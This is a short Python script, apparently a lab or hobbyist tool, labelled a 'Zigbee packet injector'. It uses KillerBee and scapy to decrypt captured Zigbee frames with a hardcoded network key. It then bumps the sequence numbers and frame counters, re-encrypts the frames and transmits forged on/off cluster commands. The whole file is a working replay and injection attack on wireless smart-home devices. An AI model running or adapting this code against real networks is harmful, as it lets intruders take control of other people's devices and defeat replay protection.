from unicodedata import decimal
from scapy import *
from killerbee.scapy_extensions import *
import argparse

parser = argparse.ArgumentParser(description="Zigbee packet injector")
parser.add_argument("-c", type=int, dest="channel", choices=range(11, 25) , default=11)

args = parser.parse_args()

key = bytes.fromhex("c7398de1956fbe125d3463a58f1e3a3c")

pkts = kbrdpcap("/home/kali/Downloads/test.pcap")

def craftPacket(pkt, data):
    print(pkt.getlayer("Dot15d4FCS").seqnum)
    pkt.getlayer("Dot15d4FCS").seqnum += 1
    print(pkt.getlayer("Dot15d4FCS").seqnum)
    pkt.getlayer("ZigbeeNWK").seqnum += 1
    data.getlayer("ZigbeeAppDataPayload").counter += 1
    data.getlayer("ZigbeeClusterLibrary").transaction_sequence += 1
    data.getlayer("ZigbeeClusterLibrary").command_identifier |= 0x00
    return kbencrypt(pkt, data, key)

dev = KillerBee(device=kbutils.devlist()[0][0])

while True:
    pkt = kbsniff(args.channel, iface=dev, count=1)
    pkt = pkts[0]
    pkt[0].show()
    # print("voor eerste if")
    if pkt[0].haslayer("ZigbeeSecurityHeader"):
        # print("voor 2e if")
        # kbwrpcap("test.pcap", pkt)
        dec = kbdecrypt(pkt[0], key)
        dec.show()

        if (dec.haslayer("ZigbeeClusterLibrary")) and (dec.getlayer("ZigbeeClusterLibrary").command_identifier == 0 or dec.getlayer("ZigbeeClusterLibrary").command_identifier == 1): 
            print("Decrypted if")
            newPkt = craftPacket(pkt, dec)
            # print("New packet")
            newPkt.show()
            kbsendp(newPkt, args.channel)

    